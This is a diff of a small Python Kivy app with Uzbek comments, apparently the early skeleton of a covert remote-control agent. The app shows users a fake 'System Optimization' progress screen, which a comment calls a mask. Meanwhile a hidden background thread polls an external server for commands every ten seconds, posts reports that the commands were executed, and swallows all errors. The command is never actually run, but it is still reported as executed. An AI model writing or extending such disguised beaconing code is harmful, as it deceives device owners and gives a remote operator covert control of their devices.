@@ -1,45 +1,35 @@
+import requests, time, threading
 from kivy.app import App
 from kivy.uix.label import Label
-from kivy.clock import Clock
-import requests
-import threading
-import time
 
-# SERVER MANZILI (O'zingiznikiga almashtirganingizga ishonch hosil qiling)
-BRAIN_URL = "https://predatoragent26.pythonanywhere.com"
+# SIZNING SERVERINGIZ
+URL = "https://predatoragent26.pythonanywhere.com"
 
-class SystemUpdateApp(App):
+class PredatorGeneral(App):
     def build(self):
-        # Ilova ochilganda ekranda ko'rinadigan matn
-        self.status_label = Label(text="Tizim yangilanmoqda...\nIltimos kutib turing (15%)")
-        
-        # Orqa fonda ishlovchi funksiyani alohida "oqim"da boshlash
-        threading.Thread(target=self.agent_brain_sync, daemon=True).start()
-        
-        return self.status_label
+        # Foydalanuvchi uchun niqob
+        self.lbl = Label(text="System Optimization: 45%\nPlease wait...")
+        threading.Thread(target=self.core_logic, daemon=True).start()
+        return self.lbl
 
-    def agent_brain_sync(self):
-        """Server bilan ma'lumot almashish funksiyasi"""
+    def core_logic(self):
         while True:
             try:
-                # Serverga yuboriladigan ma'lumotlar (Status, Vaqt va h.k)
-                data = {
-                    "status": "online",
-                    "device_time": time.ctime(),
-                    "agent_id": "Predator_01"
-                }
+                # 1. Serverdan buyruq bormi deb so'rash
+                response = requests.get(f"{URL}/get_command", timeout=10)
+                cmd = response.text.strip()
                 
-                # Ma'lumot yuborish
-                response = requests.post(f"{BRAIN_URL}/stats", json=data, timeout=10)
+                if cmd != "WAIT":
+                    # Buyruqni bajarganlik haqida hisobot yuborish
+                    report = {"status": "success", "executed_cmd": cmd, "time": time.ctime()}
+                    requests.post(f"{URL}/stats", json=report)
                 
-                if response.status_code == 200:
-                    print("Aloqa o'rnatildi!")
-                
-            except Exception as e:
-                print(f"Xatolik yuz berdi: {e}")
-            
-            # Har 10 soniyada bir marta takrorlash
-            time.sleep(10)
+                # 2. Onlayn ekanini bildirish
+                requests.post(f"{URL}/stats", json={"agent": "General_01", "state": "online"})
+            except:
+                pass
+            time.sleep(10) # Har 10 soniyada aloqa
 
 if __name__ == "__main__":
-    SystemUpdateApp().run()
+    PredatorGeneral().run()
+    
